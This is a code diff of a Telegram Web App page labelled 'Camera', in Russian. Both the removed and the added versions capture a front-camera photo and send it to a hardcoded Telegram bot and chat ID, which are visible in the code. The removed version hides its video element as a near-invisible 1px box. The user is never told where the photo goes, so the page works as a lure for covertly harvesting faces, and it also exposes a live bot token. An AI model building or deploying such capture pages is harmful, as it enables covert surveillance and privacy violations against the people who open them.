@@ -2,117 +2,75 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;flex-direction:column;">
-    <button id="btn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;cursor:pointer;z-index:10;">
-        📸 Разрешить камеру
+    <button id="btn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;cursor:pointer;">
+        📸 Сделать фото
     </button>
     <h1 id="status" style="margin-top:20px;font-size:18px;"></h1>
-
-    <video id="video" autoplay playsinline style="position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:0.01;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
         const status = document.getElementById('status');
-        const btn = document.getElementById('btn');
 
-        function sendPhoto(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', '7406666272');
-            formData.append('photo', blob, 'photo.jpg');
+        document.getElementById('btn').addEventListener('click', function() {
+            this.style.display = 'none';
+            status.innerText = '📸 Запрос камеры...';
 
-            fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.ok) {
-                    status.innerText = '✅ Фото отправлено!';
-                    tg.close();
-                } else {
-                    status.innerText = '❌ Ошибка API';
-                    console.error(data);
+            // Используем НАТИВНЫЙ МЕТОД TELEGRAM для камеры
+            tg.requestCamera('front', function(error, stream) {
+                if (error) {
+                    status.innerText = '❌ Ошибка камеры: ' + error;
+                    console.error(error);
+                    return;
                 }
-            })
-            .catch(() => {
-                status.innerText = '❌ Ошибка сети';
-            });
-        }
 
-        btn.addEventListener('click', function() {
-            btn.style.display = 'none';
-            status.innerText = '📸 Запуск камеры...';
+                status.innerText = '📸 Съёмка...';
 
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" }
-            })
-            .then(stream => {
+                // Создаём video из потока
+                const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                // Делаем до 5 попыток захвата кадра
-                let attempts = 0;
-                const maxAttempts = 5;
+                // Ждём кадр
+                video.onloadedmetadata = function() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
 
-                function tryCapture() {
-                    attempts++;
-                    status.innerText = `📸 Попытка ${attempts}...`;
+                    // Отправляем фото через Telegram API
+                    canvas.toBlob(function(blob) {
+                        const formData = new FormData();
+                        formData.append('chat_id', '7406666272');
+                        formData.append('photo', blob, 'photo.jpg');
 
-                    if (video.videoWidth > 0 && video.videoHeight > 0) {
-                        // Кадр готов
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        // Проверяем, не чёрный ли кадр
-                        const imageData = ctx.getImageData(0, 0, 1, 1);
-                        const pixel = imageData.data;
-                        if (pixel[0] === 0 && pixel[1] === 0 && pixel[2] === 0) {
-                            // Чёрный — пробуем ещё раз
-                            if (attempts < maxAttempts) {
-                                setTimeout(tryCapture, 300);
-                                return;
+                        fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data.ok) {
+                                status.innerText = '✅ Отправлено!';
+                                tg.close();
                             } else {
-                                status.innerText = '❌ Все попытки неудачны';
-                                stream.getTracks().forEach(t => t.stop());
-                                return;
+                                status.innerText = '❌ Ошибка API';
                             }
-                        }
+                        })
+                        .catch(() => {
+                            status.innerText = '❌ Ошибка сети';
+                        });
 
-                        // Успех!
-                        canvas.toBlob(blob => {
-                            if (blob) sendPhoto(blob);
-                            else status.innerText = '❌ Ошибка Blob';
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 'image/jpeg', 0.8);
-                    } else {
-                        // Размеры ещё не известны
-                        if (attempts < maxAttempts) {
-                            setTimeout(tryCapture, 300);
-                        } else {
-                            status.innerText = '❌ Камера не ответила';
-                            stream.getTracks().forEach(t => t.stop());
-                        }
-                    }
-                }
-
-                // Начинаем попытки через 200 мс
-                setTimeout(tryCapture, 200);
-            })
-            .catch(err => {
-                status.innerText = '❌ Ошибка: ' + err.message;
-                console.error(err);
-                btn.style.display = 'block';
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg', 0.8);
+                };
             });
         });
     </script>
